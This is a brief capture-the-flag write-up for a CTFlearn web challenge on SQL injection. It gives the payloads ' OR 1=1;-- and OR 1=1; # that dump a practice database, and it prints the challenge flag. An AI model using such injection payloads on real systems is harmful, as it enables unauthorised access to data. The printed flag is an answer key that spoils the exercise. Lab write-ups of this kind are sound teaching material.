# Basic Injection
Category: Web

## Description

> See if you can leak the whole database using what you know about SQL Injections. [link](https://web.ctflearn.com/web4/).  

# Solution

Normally, we'll input the standard `' OR 1=1;--`. This time however, this does not give is the answer, probably because we have different SQL engine. Chenging our input to `OR 1=1; #` leaks the database and gives us the answer
```
Name: fl4g__giv3r
Data: CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs} 
```